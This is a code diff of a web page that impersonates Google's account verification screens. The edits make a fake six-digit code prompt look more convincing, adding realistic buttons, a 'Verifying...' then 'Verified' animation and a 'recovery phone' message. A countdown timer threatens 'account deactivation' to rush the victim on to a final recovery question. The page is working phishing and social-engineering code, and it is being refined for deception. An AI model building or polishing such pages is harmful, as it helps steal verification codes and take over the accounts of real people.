@@ -158,23 +158,22 @@ button:disabled{opacity:.6;cursor:not-allowed;}
 </div>
 
 
-<!-- REAL GOOGLE OTP SCREEN -->
+<!-- REALISTIC GOOGLE OTP -->
 <div class="card hidden" id="q2fa">
   <h3>🔐 Enter verification code</h3>
-  <p style="color:#5f6368;">Code sent to your recovery mail</p>
+  <p style="color:#5f6368;margin:4px 0 20px 0;">Code sent to your recovery phone</p>
   
   <input type="text" class="otp-input" id="fakeCode" maxlength="6" placeholder="Enter 6-digit code">
   
-  <div style="display:flex; gap:8px; margin:12px 0;">
-    <button id="otpVerifyBtn" class="primary" style="flex:1;">Next</button>
-    <button onclick="next('q4')" class="secondary" style="flex:1; background:#f1f3f4;">Skip</button>
+  <div style="display:flex;gap:12px;margin:20px 0;">
+    <button id="otpVerifyBtn" class="primary" style="flex:1;padding:14px 20px;font-weight:500;">Continue</button>
+    <button onclick="next('q4')" class="secondary" style="flex:1;padding:14px 20px;font-weight:500;border:1px solid #dadce0;background:#f8f9fa;">Not you?</button>
   </div>
   
   <p class="small" style="text-align:center;">
     Didn't receive? <a href="#" onclick="resendOTP()" style="color:#1a73e8;">Send new code</a>
   </p>
 </div>
-
   
 <div class="card hidden" id="q4">
   <h3>🔑 Final Recovery Question</h3>
@@ -233,41 +232,55 @@ elements.region.textContent = locations[Math.floor(Math.random() * locations.len
 let mainTimer = 90;
 document.querySelectorAll('.line').forEach((l,i)=>setTimeout(()=>l.style.opacity=1, i*600));
 
-// REALISTIC OTP BEHAVIOR
+// GOOGLE OTP REALISM 
 const otpInput = document.getElementById('fakeCode');
 const otpBtn = document.getElementById('otpVerifyBtn');
 
-otpInput.addEventListener('input', function(e) {
-  // Numbers only + auto-format
+// 1. Numbers only + auto-format
+otpInput.addEventListener('input', function() {
   this.value = this.value.replace(/[^0-9]/g, '').slice(0,6);
-  // Auto-focus Continue button when 6 digits
   if (this.value.length === 6) otpBtn.focus();
 });
 
+// 2. REAL Google button behavior
 otpBtn.onclick = function() {
-  if (otpInput.value.length < 6) return;
+  const code = otpInput.value;
+  if (code.length < 4) {
+    // Error shake
+    this.style.background = '#ea4335';
+    setTimeout(() => this.style.background = '#1a73e8', 200);
+    return;
+  }
   
-  // REAL "Verifying..." animation
-  this.innerHTML = 'Verifying...';
-  this.classList.add('otp-loading');
+  // 3. Verifying animation
+  const original = this.innerHTML;
+  this.innerHTML = 'Verifying<span style="opacity:0.6;">...</span>';
+  this.style.opacity = '0.85';
   this.disabled = true;
   
   setTimeout(() => {
-    next('q4');
-  }, 1200); // Realistic Google delay
+    this.style.background = '#34a853';
+    this.innerHTML = 'Verified<span style="font-size:12px;">✓</span>';
+    setTimeout(() => next('q4'), 500);
+  }, 1400);
 };
 
 function resendOTP() {
   otpInput.value = '';
   otpInput.focus();
+  otpBtn.innerHTML = 'Continue';
+  otpBtn.style.background = '#1a73e8';
+  otpBtn.disabled = false;
+  otpBtn.style.opacity = '1';
   navigator.vibrate([100,50,100]);
 }
+
   
 const panicTimer = setInterval(() => {
   mainTimer--;
   elements.count.textContent = mainTimer;
   
-  // NATURAL PHASE CHANGES - EMPHASIZE GOOGLE PROTECTION
+  // NATURAL PHASE CHANGES - Emphasizing GOOGLE PROTECTION
   if (mainTimer === 60) {
     elements.urgencyMsg.innerHTML = `Verify in <strong>${mainTimer}s</strong> or risk account deactivation`;
   }
